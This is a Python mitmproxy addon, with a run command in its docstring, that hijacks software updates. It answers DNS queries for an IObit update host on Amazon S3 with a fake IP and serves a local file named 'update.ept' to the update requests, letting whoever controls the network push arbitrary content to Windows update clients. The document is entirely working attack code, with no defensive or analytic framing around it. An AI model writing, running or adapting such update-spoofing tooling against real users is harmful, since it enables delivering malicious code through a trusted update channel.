"""
mitmproxy addon: spoof DNS for TARGET and serve PAYLOAD to HTTP requests
whose Host header is TARGET (or a subdomain) and whose path is TARGET_PATH.
Everything else passes through. Hits are marked so mitmdump can show only them.

Run (as your normal user, not root):
  nix-shell -p mitmproxy --run 'mitmdump \
    --mode transparent@18080 --mode dns@15353 \
    --set termlog_verbosity=warn --set dumper_filter="~marked" \
    -s ~/mitm/serve.py'
"""

import ipaddress
import logging
import mimetypes
from pathlib import Path

from mitmproxy import ctx, dns, http

TARGET = "updates3.iobit.com.s3.amazonaws.com"                  # hostname only, no scheme or path
TARGET_PATH = None   # set to None to match every path on TARGET
PAYLOAD = Path.home() / "mitm" / "update.ept"
FAKE_IP = ipaddress.IPv4Address("192.168.123.1")  # any public IP; traffic never actually reaches it

CONTENT_TYPE = (
    mimetypes.guess_type(TARGET_PATH or "")[0] or "application/octet-stream"
)
MARK = ":default:"


def _match(name: str) -> bool:
    name = (name or "").rstrip(".").lower()
    return name == TARGET or name.endswith("." + TARGET)


def running() -> None:
    state = f"{PAYLOAD} ({PAYLOAD.stat().st_size} bytes)" if PAYLOAD.is_file() else f"{PAYLOAD} MISSING"
    print(
        f"ready: modes={', '.join(ctx.options.mode)}\n"
        f"       target=http://{TARGET}{TARGET_PATH or '/*'}\n"
        f"       dns {TARGET} -> {FAKE_IP}\n"
        f"       payload={state}\n"
        f"waiting for hits...",
        flush=True,
    )


def dns_request(flow: dns.DNSFlow) -> None:
    q = flow.request.question
    if not (q and _match(q.name)):
        return
    flow.marked = MARK
    if q.type == 1:  # A
        flow.response = flow.request.succeed([dns.ResourceRecord.A(q.name, FAKE_IP, ttl=60)])
    else:  # AAAA etc.: empty answer so Windows falls back to IPv4
        flow.response = flow.request.succeed([])


def request(flow: http.HTTPFlow) -> None:
    host = (flow.request.host_header or "").split(":")[0]
    if not _match(host):
        return

    flow.marked = MARK  # show every request to TARGET, including other paths

    path = flow.request.path.split("?")[0]
    if TARGET_PATH and path != TARGET_PATH:
        return  # passes through to the real host; still shown because it's marked

    if not PAYLOAD.is_file():
        logging.warning(f"{PAYLOAD} not found, returning 404")
        flow.response = http.Response.make(404, b"payload missing\n", {"Content-Type": "text/plain"})
        return

    flow.response = http.Response.make(200, PAYLOAD.read_bytes(), {"Content-Type": CONTENT_TYPE})
